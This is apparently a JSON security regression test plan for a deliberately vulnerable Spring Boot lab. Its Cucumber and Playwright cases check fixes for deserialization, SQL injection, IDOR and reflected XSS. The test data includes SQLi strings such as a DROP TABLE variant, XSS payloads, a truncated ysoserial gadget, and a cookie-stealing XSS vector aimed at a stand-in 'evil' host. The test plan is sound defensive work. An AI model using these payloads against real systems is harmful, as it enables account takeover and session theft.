@@ -1,0 +1,531 @@
+{
+  "metadata": {
+    "reportName": "SECURE_REMEDIATION_REPORT.md",
+    "reportPath": ".claude/reports/SECURE_REMEDIATION_REPORT.md",
+    "generatedAt": "2026-06-30",
+    "baseUrl": "http://localhost:8080",
+    "framework": "playwright+cucumber",
+    "stepDefinitionLanguage": "java",
+    "frameworkRationale": "Java chosen because the application is Spring Boot 3 / Java 17. Cucumber-JVM and Playwright-Java keep one language across the system under test and the test suite, simplifying CI and IDE support.",
+    "testRunner": {
+      "build": "mvn -B -q compile test-compile",
+      "runApp": "mvn spring-boot:run",
+      "runTests": "mvn test -Dtest=RunCucumberTest"
+    },
+    "seededUsers": {
+      "alice": {"username": "alice", "password": "alice123", "role": "USER"},
+      "bob":   {"username": "bob",   "password": "bob123",   "role": "USER"},
+      "admin": {"username": "admin", "password": "admin123", "role": "ADMIN"}
+    },
+    "basicAuthHeaders": {
+      "alice": "Basic YWxpY2U6YWxpY2UxMjM=",
+      "bob":   "Basic Ym9iOmJvYjEyMw==",
+      "admin": "Basic YWRtaW46YWRtaW4xMjM="
+    }
+  },
+  "testCases": [
+    {
+      "id": "TC-VULN-001",
+      "vulnId": "VULN-001",
+      "title": "Insecure Java Native Deserialization (RCE) — endpoint now parses JSON only",
+      "category": "A08:2021 - Software and Data Integrity Failures",
+      "cwe": "CWE-502",
+      "severity": "CRITICAL",
+      "priority": "P0",
+      "endpoint": "POST /api/deserialize",
+      "surface": "api",
+      "description": "The original endpoint used ObjectInputStream.readObject() on attacker-supplied base64, exposing the JVM to ysoserial gadget-chain RCE. The fix replaces the body parser with Jackson's readValue(String, Map.class); content-type is now application/json and the response is a small Map describing the parsed payload.",
+      "preconditions": [
+        "Spring Boot app is running on http://localhost:8080",
+        "Test has HTTP Basic credentials for alice (alice:alice123) — endpoint requires authentication after VULN-005"
+      ],
+      "testData": {
+        "validJsonBody": "{\"name\":\"alice\",\"amount\":100}",
+        "maliciousBase64Gadget": "rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0...",
+        "contentType": "application/json"
+      },
+      "expectedOutcome": [
+        "A 200 response with body {\"type\":\"Map<String,Object>\",\"size\":2} for valid JSON input",
+        "A gadget chain sent with Content-Type: text/plain is rejected (415 Unsupported Media Type or 400)",
+        "Even if a crafted binary stream is sent with Content-Type: application/json, Jackson returns a parse error — no Java deserialization occurs"
+      ],
+      "attackVector": "Send a base64-encoded ysoserial gadget chain (e.g. CommonsCollections1) as the request body to trigger RCE via readObject().",
+      "cucumberFeature": "Feature: VULN-001 - Insecure deserialization is removed\n  Background:\n    Given the Spring Boot app is running on http://localhost:8080\n    And HTTP Basic credentials for alice are available\n\n  @security @vuln-001 @critical @regression\n  Scenario: Valid JSON payload is parsed as a Map\n    When I POST \"{\\\"name\\\":\\\"alice\\\",\\\"amount\\\":100}\" to /api/deserialize with Content-Type application/json as alice\n    Then the response status is 200\n    And the response body contains \"Map<String,Object>\"\n    And the response body contains \"size\":2\n\n  @security @vuln-001 @critical @regression\n  Scenario: Base64 gadget chain no longer executes native deserialization\n    When I POST a base64-encoded ysoserial gadget chain to /api/deserialize with Content-Type application/json as alice\n    Then the response status is not 200 with an instantiated Java class\n    And the response body does not contain \"Deserialized:\"\n    And the server does not instantiate any java.* class from the request",
+      "playwrightSteps": [
+        {
+          "step": 1,
+          "action": "request.post",
+          "url": "http://localhost:8080/api/deserialize",
+          "headers": {
+            "Content-Type": "application/json",
+            "Authorization": "Basic YWxpY2U6YWxpY2UxMjM="
+          },
+          "data": "{\"name\":\"alice\",\"amount\":100}",
+          "expect": {
+            "status": 200,
+            "bodyContains": ["Map<String,Object>", "\"size\":2"]
+          }
+        },
+        {
+          "step": 2,
+          "action": "request.post",
+          "url": "http://localhost:8080/api/deserialize",
+          "headers": {
+            "Content-Type": "application/json",
+            "Authorization": "Basic YWxpY2U6YWxpY2UxMjM="
+          },
+          "data": "rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0...",
+          "expect": {
+            "statusNot": 200,
+            "bodyNotContains": ["Deserialized:"],
+            "noClassInstantiation": true
+          }
+        },
+        {
+          "step": 3,
+          "action": "request.post",
+          "url": "http://localhost:8080/api/deserialize",
+          "headers": {
+            "Content-Type": "text/plain",
+            "Authorization": "Basic YWxpY2U6YWxpY2UxMjM="
+          },
+          "data": "rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0...",
+          "expect": {
+            "status": [400, 415],
+            "rationale": "text/plain is no longer accepted; only application/json is."
+          }
+        }
+      ],
+      "stepDefinitions": [
+        "@When(\"I POST {string} to /api/deserialize with Content-Type application/json as alice\")",
+        "public void postJsonDeserialize(String body) {",
+        "    Response r = given()",
+        "        .auth().preemptive().basic(\"alice\", \"alice123\")",
+        "        .contentType(\"application/json\")",
+        "        .body(body)",
+        "        .when().post(BASE + \"/api/deserialize\");",
+        "    this.lastResponse = r;",
+        "}",
+        "",
+        "@When(\"I POST a base64-encoded ysoserial gadget chain to /api/deserialize with Content-Type application/json as alice\")",
+        "public void postGadgetDeserialize() {",
+        "    String gadget = \"rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0...\";",
+        "    Response r = given()",
+        "        .auth().preemptive().basic(\"alice\", \"alice123\")",
+        "        .contentType(\"application/json\")",
+        "        .body(gadget)",
+        "        .when().post(BASE + \"/api/deserialize\");",
+        "    this.lastResponse = r;",
+        "}",
+        "",
+        "@Then(\"the response body does not contain {string}\")",
+        "public void bodyDoesNotContain(String s) {",
+        "    assertThat(lastResponse.getBody().asString()).doesNotContain(s);",
+        "}",
+        "",
+        "@Then(\"the server does not instantiate any java.* class from the request\")",
+        "public void noJavaClassInstantiation() {",
+        "    String body = lastResponse.getBody().asString();",
+        "    assertThat(body).doesNotContainPattern(\"Deserialized:\\\\s+[a-zA-Z0-9_.$]+\");",
+        "}"
+      ],
+      "tags": ["@security", "@vuln-001", "@critical", "@regression"]
+    },
+    {
+      "id": "TC-VULN-002",
+      "vulnId": "VULN-002",
+      "title": "SQL Injection in loginUnsafe — authentication bypass blocked",
+      "category": "A03:2021 - Injection (SQLi)",
+      "cwe": "CWE-89",
+      "severity": "CRITICAL",
+      "priority": "P0",
+      "endpoint": "POST /api/login",
+      "surface": "api",
+      "description": "The original /api/login built the SQL with string concatenation, allowing a payload like username=' OR '1'='1 -- to bypass authentication. The fix replaces the SQL with a named-parameter bind (:username) and verifies the supplied password against the stored BCrypt hash via PasswordEncoder.matches().",
+      "preconditions": [
+        "Spring Boot app is running",
+        "Seeded users exist: alice/alice123, bob/bob123, admin/admin123"
+      ],
+      "testData": {
+        "sqliPayload": {
+          "username": "alice' OR '1'='1",
+          "password": "anything"
+        },
+        "sqliPayloadAlt": {
+          "username": "admin'--",
+          "password": "x"
+        },
+        "validCreds": {
+          "username": "alice",
+          "password": "alice123"
+        },
+        "invalidCreds": {
+          "username": "alice",
+          "password": "wrongPassword"
+        }
+      },
+      "expectedOutcome": [
+        "Valid credentials return 200 with {id, username, role} (no password field)",
+        "SQLi payloads return 401 with {\"error\":\"Invalid credentials\"} - no row is matched",
+        "Wrong passwords return 401 - bcrypt matches() fails",
+        "The response NEVER contains a 'password' key (VULN-009 cross-check)"
+      ],
+      "attackVector": "Send username=' OR '1'='1 with any password to bypass the WHERE clause and authenticate as the first row in the users table.",
+      "cucumberFeature": "Feature: VULN-002 - SQL injection no longer bypasses login\n  Background:\n    Given the Spring Boot app is running on http://localhost:8080\n\n  @security @vuln-002 @critical @regression\n  Scenario: Valid credentials authenticate and return no password field\n    When I POST {\"username\":\"alice\",\"password\":\"alice123\"} to /api/login\n    Then the response status is 200\n    And the response JSON has field \"username\" with value \"alice\"\n    And the response JSON does not have a \"password\" field\n\n  @security @vuln-002 @critical @regression\n  Scenario Outline: SQL injection payloads are rejected\n    When I POST {\"username\":\"<payload>\",\"password\":\"anything\"} to /api/login\n    Then the response status is 401\n    And the response JSON has field \"error\" with value \"Invalid credentials\"\n    Examples:\n      | payload               |\n      | alice' OR '1'='1      |\n      | admin'--              |\n      | ' OR 1=1 --           |\n      | alice'; DROP TABLE--  |\n\n  @security @vuln-002 @critical @regression\n  Scenario: Wrong password is rejected\n    When I POST {\"username\":\"alice\",\"password\":\"wrongPassword\"} to /api/login\n    Then the response status is 401",
+      "playwrightSteps": [
+        {
+          "step": 1,
+          "action": "request.post",
+          "url": "http://localhost:8080/api/login",
+          "headers": {"Content-Type": "application/json"},
+          "data": "{\"username\":\"alice\",\"password\":\"alice123\"}",
+          "expect": {"status": 200, "jsonPath.username": "alice", "jsonPathNoPassword": true}
+        },
+        {
+          "step": 2,
+          "action": "request.post",
+          "url": "http://localhost:8080/api/login",
+          "headers": {"Content-Type": "application/json"},
+          "data": "{\"username\":\"alice' OR '1'='1\",\"password\":\"anything\"}",
+          "expect": {"status": 401, "jsonPath.error": "Invalid credentials"}
+        },
+        {
+          "step": 3,
+          "action": "request.post",
+          "url": "http://localhost:8080/api/login",
+          "headers": {"Content-Type": "application/json"},
+          "data": "{\"username\":\"admin'--\",\"password\":\"x\"}",
+          "expect": {"status": 401, "jsonPath.error": "Invalid credentials"}
+        },
+        {
+          "step": 4,
+          "action": "request.post",
+          "url": "http://localhost:8080/api/login",
+          "headers": {"Content-Type": "application/json"},
+          "data": "{\"username\":\"alice\",\"password\":\"wrongPassword\"}",
+          "expect": {"status": 401}
+        }
+      ],
+      "stepDefinitions": [
+        "@When(\"I POST {string} to /api/login\")",
+        "public void postLogin(String jsonBody) {",
+        "    this.lastResponse = given()",
+        "        .contentType(\"application/json\")",
+        "        .body(jsonBody)",
+        "        .when().post(BASE + \"/api/login\");",
+        "}",
+        "",
+        "@Then(\"the response JSON has field {string} with value {string}\")",
+        "public void jsonFieldEquals(String field, String value) {",
+        "    lastResponse.then().body(field, equalTo(value));",
+        "}",
+        "",
+        "@Then(\"the response JSON does not have a {string} field\")",
+        "public void jsonFieldAbsent(String field) {",
+        "    String body = lastResponse.getBody().asString();",
+        "    assertThat(body).doesNotContain(\"\\\"\" + field + \"\\\"\");",
+        "}"
+      ],
+      "tags": ["@security", "@vuln-002", "@critical", "@regression"]
+    },
+    {
+      "id": "TC-VULN-006",
+      "vulnId": "VULN-006",
+      "title": "IDOR on /api/profile/{id} and /api/users — ownership and ADMIN role enforced",
+      "category": "A01:2021 - Broken Access Control (IDOR)",
+      "cwe": "CWE-639",
+      "severity": "CRITICAL",
+      "priority": "P0",
+      "endpoint": "GET /api/profile/{id}, GET /api/users, POST /api/transfer",
+      "surface": "api",
+      "description": "Originally any authenticated caller could read any user's profile (GET /api/profile/{id}) and any caller could list all users (GET /api/users). The fix restricts /api/users to ADMIN and /api/profile/{id} to the resource owner OR ADMIN. The same ownership rule is applied to /api/transfer's source account.",
+      "preconditions": [
+        "Spring Boot app is running",
+        "Seeded users exist: alice (id=1), bob (id=2), admin (id=3) - exact IDs may vary, query via admin login if needed"
+      ],
+      "testData": {
+        "aliceId": 1,
+        "bobId": 2,
+        "adminId": 3
+      },
+      "expectedOutcome": [
+        "Anonymous request to /api/users returns 401 (VULN-005 cross-check)",
+        "alice calling /api/users returns 403 AccessDeniedException (ADMIN required)",
+        "alice calling GET /api/profile/{bobId} returns 403 (cannot view another user's profile)",
+        "alice calling GET /api/profile/{aliceId} returns 200 with her own user object",
+        "admin calling /api/users returns 200 with the full list",
+        "admin calling GET /api/profile/{bobId} returns 200 (admin override)",
+        "alice calling POST /api/transfer with fromId=bobId returns 403 (cannot transfer from another user's account)"
+      ],
+      "attackVector": "Horizontal privilege escalation: log in as a low-privilege user (alice) and read bob's profile or initiate a transfer from bob's account by changing the {id} or fromId parameter.",
+      "cucumberFeature": "Feature: VULN-006 - IDOR on profile and user listing is closed\n  Background:\n    Given the Spring Boot app is running on http://localhost:8080\n    And seeded users alice, bob, and admin exist\n\n  @security @vuln-006 @critical @regression\n  Scenario: Anonymous user is denied access to /api/users\n    When I GET /api/users with no credentials\n    Then the response status is 401\n\n  @security @vuln-006 @critical @regression\n  Scenario: Non-admin user cannot enumerate all users\n    Given I am authenticated as alice with password alice123\n    When I GET /api/users\n    Then the response status is 403\n\n  @security @vuln-006 @critical @regression\n  Scenario: User cannot read another user's profile\n    Given I am authenticated as alice with password alice123\n    When I GET /api/profile/2\n    Then the response status is 403\n\n  @security @vuln-006 @critical @regression\n  Scenario: User can read their own profile\n    Given I am authenticated as alice with password alice123\n    When I GET /api/profile/1\n    Then the response status is 200\n    And the response JSON has field \"username\" with value \"alice\"\n\n  @security @vuln-006 @critical @regression\n  Scenario: Admin can enumerate all users\n    Given I am authenticated as admin with password admin123\n    When I GET /api/users\n    Then the response status is 200\n    And the response is a JSON array containing \"alice\", \"bob\", \"admin\"\n\n  @security @vuln-006 @critical @regression\n  Scenario: User cannot transfer funds from another user's account\n    Given I am authenticated as alice with password alice123\n    When I POST {\"fromId\":2,\"toId\":1,\"amount\":50} to /api/transfer\n    Then the response status is 403",
+      "playwrightSteps": [
+        {
+          "step": 1,
+          "action": "request.get",
+          "url": "http://localhost:8080/api/users",
+          "expect": {"status": 401}
+        },
+        {
+          "step": 2,
+          "action": "request.get",
+          "url": "http://localhost:8080/api/users",
+          "headers": {"Authorization": "Basic YWxpY2U6YWxpY2UxMjM="},
+          "expect": {"status": 403}
+        },
+        {
+          "step": 3,
+          "action": "request.get",
+          "url": "http://localhost:8080/api/profile/2",
+          "headers": {"Authorization": "Basic YWxpY2U6YWxpY2UxMjM="},
+          "expect": {"status": 403}
+        },
+        {
+          "step": 4,
+          "action": "request.get",
+          "url": "http://localhost:8080/api/profile/1",
+          "headers": {"Authorization": "Basic YWxpY2U6YWxpY2UxMjM="},
+          "expect": {"status": 200, "jsonPath.username": "alice"}
+        },
+        {
+          "step": 5,
+          "action": "request.get",
+          "url": "http://localhost:8080/api/users",
+          "headers": {"Authorization": "Basic YWRtaW46YWRtaW4xMjM="},
+          "expect": {"status": 200, "isArray": true, "contains": ["alice", "bob", "admin"]}
+        },
+        {
+          "step": 6,
+          "action": "request.get",
+          "url": "http://localhost:8080/api/profile/2",
+          "headers": {"Authorization": "Basic YWRtaW46YWRtaW4xMjM="},
+          "expect": {"status": 200}
+        },
+        {
+          "step": 7,
+          "action": "request.post",
+          "url": "http://localhost:8080/api/transfer",
+          "headers": {
+            "Content-Type": "application/json",
+            "Authorization": "Basic YWxpY2U6YWxpY2UxMjM="
+          },
+          "data": "{\"fromId\":2,\"toId\":1,\"amount\":50}",
+          "expect": {"status": 403}
+        }
+      ],
+      "stepDefinitions": [
+        "@Given(\"I am authenticated as {word} with password {word}\")",
+        "public void authAs(String user, String pass) {",
+        "    this.creds = user + \":\" + pass;",
+        "}",
+        "",
+        "@When(\"I GET /api/users\")",
+        "public void getUsers() {",
+        "    if (creds == null) {",
+        "        this.lastResponse = given().when().get(BASE + \"/api/users\");",
+        "    } else {",
+        "        String[] c = creds.split(\":\");",
+        "        this.lastResponse = given().auth().preemptive().basic(c[0], c[1])",
+        "            .when().get(BASE + \"/api/users\");",
+        "    }",
+        "}",
+        "",
+        "@When(\"I GET /api/profile/{int}\")",
+        "public void getProfile(int id) {",
+        "    String[] c = creds.split(\":\");",
+        "    this.lastResponse = given().auth().preemptive().basic(c[0], c[1])",
+        "        .when().get(BASE + \"/api/profile/\" + id);",
+        "}",
+        "",
+        "@When(\"I POST {string} to /api/transfer\")",
+        "public void postTransfer(String body) {",
+        "    String[] c = creds.split(\":\");",
+        "    this.lastResponse = given()",
+        "        .auth().preemptive().basic(c[0], c[1])",
+        "        .contentType(\"application/json\")",
+        "        .body(body)",
+        "        .when().post(BASE + \"/api/transfer\");",
+        "}",
+        "",
+        "@Then(\"the response is a JSON array containing {string}\")",
+        "public void arrayContains(String element) {",
+        "    lastResponse.then().body(\"username\", hasItem(element));",
+        "}"
+      ],
+      "tags": ["@security", "@vuln-006", "@critical", "@regression"]
+    },
+    {
+      "id": "TC-VULN-007",
+      "vulnId": "VULN-007",
+      "title": "Reflected XSS in /api/comment/greet — payload HTML-escaped in response",
+      "category": "A03:2021 - Injection (XSS - Reflected)",
+      "cwe": "CWE-79",
+      "severity": "HIGH",
+      "priority": "P1",
+      "endpoint": "GET /api/comment/greet?name=<payload>",
+      "surface": "api",
+      "description": "The original handler concatenated the name query parameter directly into an HTML response, allowing reflected XSS such as <script>alert(1)</script>. The fix runs the name through Spring's HtmlUtils.htmlEscape(...) before concatenation, so angle brackets are rendered as &lt; / &gt; entities and the browser does not parse them as markup.",
+      "preconditions": [
+        "Spring Boot app is running",
+        "Browser launched via Playwright (Chromium) so we can read the live DOM"
+      ],
+      "testData": {
+        "xssPayload": "<script>alert('XSS')</script>",
+        "imgPayload": "<img src=x onerror=alert(1)>",
+        "svgPayload": "<svg/onload=alert(1)>",
+        "benignName": "Alice"
+      },
+      "expectedOutcome": [
+        "GET /api/comment/greet?name=Alice returns 200 with 'Hello, Alice!'",
+        "GET /api/comment/greet?name=<script>alert('XSS')</script> returns the literal text with &lt;script&gt; - no script tag is parsed in the DOM",
+        "Playwright's page.locator('h1').textContent() matches 'Hello, <script>alert(\"XSS\")</script>!' literally - no alert dialog fires",
+        "Content-Security-Policy response header is present (VULN-016 cross-check): default-src 'self'; script-src 'self'; object-src 'none'"
+      ],
+      "attackVector": "Phishing link of the form http://localhost:8080/api/comment/greet?name=<script>document.location='https://evil/?c='+document.cookie</script> to steal the victim's session cookie when rendered in their browser.",
+      "cucumberFeature": "Feature: VULN-007 - Reflected XSS in /api/comment/greet is escaped\n  Background:\n    Given the Spring Boot app is running on http://localhost:8080\n\n  @security @vuln-007 @high @regression\n  Scenario: Benign name renders normally\n    When I navigate to /api/comment/greet?name=Alice via Playwright\n    Then the page h1 reads \"Hello, Alice!\"\n\n  @security @vuln-007 @high @regression\n  Scenario: Script tag payload is escaped and not executed\n    When I navigate to /api/comment/greet?name=<script>alert('XSS')</script> via Playwright\n    Then no alert dialog is shown\n    And the page h1 contains the literal text \"&lt;script&gt;alert('XSS')&lt;/script&gt;!\"\n    And no <script> element was injected into the DOM\n\n  @security @vuln-007 @high @regression\n  Scenario: CSP defence-in-depth header is present\n    When I navigate to /api/comment/greet?name=Alice via Playwright\n    Then the response header Content-Security-Policy contains \"default-src 'self'\"\n    And the response header Content-Security-Policy contains \"script-src 'self'\"",
+      "playwrightSteps": [
+        {
+          "step": 1,
+          "action": "page.goto",
+          "url": "http://localhost:8080/api/comment/greet?name=Alice",
+          "expect": {"locator": "h1", "text": "Hello, Alice!"}
+        },
+        {
+          "step": 2,
+          "action": "page.goto",
+          "url": "http://localhost:8080/api/comment/greet?name=<script>alert('XSS')</script>",
+          "attachDialogHandler": "reject_any_dialog",
+          "expect": {
+            "locator": "h1",
+            "textContains": "&lt;script&gt;",
+            "noScriptInjected": true,
+            "noDialogFired": true
+          }
+        },
+        {
+          "step": 3,
+          "action": "page.goto",
+          "url": "http://localhost:8080/api/comment/greet?name=<img src=x onerror=alert(1)>",
+          "attachDialogHandler": "reject_any_dialog",
+          "expect": {
+            "noImgOnerrorFired": true,
+            "textContains": "&lt;img"
+          }
+        },
+        {
+          "step": 4,
+          "action": "response.headers",
+          "url": "http://localhost:8080/api/comment/greet?name=Alice",
+          "expect": {
+            "headerContains": {
+              "content-security-policy": ["default-src 'self'", "script-src 'self'", "object-src 'none'"]
+            }
+          }
+        }
+      ],
+      "stepDefinitions": [
+        "@When(\"I navigate to {string} via Playwright\")",
+        "public void navigateTo(String url) {",
+        "    page.navigate(url);",
+        "    this.lastResponse = page.context().lastResponse();",
+        "}",
+        "",
+        "@Then(\"no alert dialog is shown\")",
+        "public void noDialog() {",
+        "    // page.onDialog handler installed in @Before: any dialog throws AssertionError",
+        "}",
+        "",
+        "@Then(\"the page h1 contains the literal text {string}\")",
+        "public void h1Contains(String text) {",
+        "    String h1 = page.locator(\"h1\").textContent();",
+        "    assertThat(h1).contains(text);",
+        "}",
+        "",
+        "@Then(\"no <script> element was injected into the DOM\")",
+        "public void noScriptInjected() {",
+        "    int count = page.locator(\"h1 script\").count();",
+        "    assertThat(count).isEqualTo(0);",
+        "}",
+        "",
+        "@Then(\"the response header {string} contains {string}\")",
+        "public void headerContains(String header, String value) {",
+        "    assertThat(lastResponse.header(header)).contains(value);",
+        "}"
+      ],
+      "tags": ["@security", "@vuln-007", "@high", "@regression"]
+    }
+  ],
+  "authenticationHelpers": {
+    "formLogin": {
+      "note": "Form login at POST /login (Spring Security default) - use this for UI/Thymeleaf flows. JSON API auth uses HTTP Basic.",
+      "playwrightExample": [
+        "await page.goto('http://localhost:8080/login');",
+        "await page.fill('input[name=username]', 'alice');",
+        "await page.fill('input[name=password]', 'alice123');",
+        "await page.click('button[type=submit]');",
+        "// Subsequent requests carry JSESSIONID; Playwright uses the same browser context."
+      ]
+    },
+    "httpBasic": {
+      "note": "Use for /api/* calls. Build header as 'Basic ' + base64('user:pass'). Pre-computed headers are in metadata.basicAuthHeaders.",
+      "headerForAlice": "Authorization: Basic YWxpY2U6YWxpY2UxMjM=",
+      "headerForBob":   "Authorization: Basic Ym9iOmJvYjEyMw==",
+      "headerForAdmin": "Authorization: Basic YWRtaW46YWRtaW4xMjM="
+    },
+    "csrf": {
+      "note": "CSRF is enabled (VULN-011). For cookie-based browser flows, read the XSRF-TOKEN cookie and echo it back as the X-XSRF-TOKEN header on POST/PUT/DELETE.",
+      "playwrightExample": [
+        "const csrf = await page.evaluate(() => document.cookie.match(/XSRF-TOKEN=([^;]+)/)?.[1]);",
+        "await page.setExtraHTTPHeaders({ 'X-XSRF-TOKEN': csrf });"
+      ]
+    }
+  },
+  "playwrightConfig": {
+    "configFile": "playwright.config.ts",
+    "baseURL": "http://localhost:8080",
+    "timeout": 30000,
+    "expectTimeout": 5000,
+    "headless": true,
+    "browsers": ["chromium"],
+    "use": {
+      "ignoreHTTPSErrors": true,
+      "trace": "on-first-retry",
+      "screenshot": "only-on-failure"
+    }
+  },
+  "cucumberConfig": {
+    "configFile": "cucumber.properties",
+    "glue": "com.owasp.lab.bdd.stepdefs",
+    "features": "src/test/resources/features",
+    "plugin": ["pretty", "html:build/reports/cucumber.html", "json:build/reports/cucumber.json"],
+    "tags": "@security and not @wip"
+  },
+  "executionNotes": [
+    "1. Build the Spring Boot app first: cd vulnerable-springboot-app-feature-2.1 && mvn -B -ntp -DskipTests package",
+    "2. Start the app in the background: mvn spring-boot:run (wait for 'Started Application' on stdout)",
+    "3. H2 console is OFF by default. If needed, start with H2_CONSOLE_ENABLED=true",
+    "4. Run the BDD suite from the Playwright_Automation folder: mvn test (or npx playwright test for the pure-Playwright path)",
+    "5. Seeded users are created on every app start from DataSeeder (alice/alice123, bob/bob123, admin/admin123)"
+  ],
+  "humanFollowUp": [
+    {
+      "vulnId": "VULN-013",
+      "title": "JWT signing key entropy",
+      "reason": "The fix is a config-only change (env-var placeholder). End-to-end JWT forgery testing requires a deploy-time env var and a JWT verifier endpoint that is not present in this lab. Manual verification: set APP_SECRET_JWT_SIGNING_KEY to a 256-bit SecureRandom value, confirm empty default fails closed in SecretConfig.",
+      "manualChecklist": [
+        "Run app without APP_SECRET_JWT_SIGNING_KEY and verify SecretConfig.jwtSigningKey is empty string",
+        "Confirm /vulnerabilities page no longer renders the literal signing key (VULN-018 cross-check)",
+        "Generate a 32-byte SecureRandom key for deploy: openssl rand -base64 32"
+      ]
+    },
+    {
+      "vulnId": "VULN-014",
+      "title": "Verbose SQL logging disabled",
+      "reason": "Config-only fix; no behavioural endpoint to verify end-to-end. Manual verification: tail application logs and confirm no SELECT statements appear at INFO/DEBUG.",
+      "manualChecklist": [
+        "Run with default config and check that 'select' does not appear in stdout",
+        "Trigger a /api/login and a /api/transfer and confirm logs do not contain the SQL text or the bound username/password"
+      ]
+    }
+  ]
+}
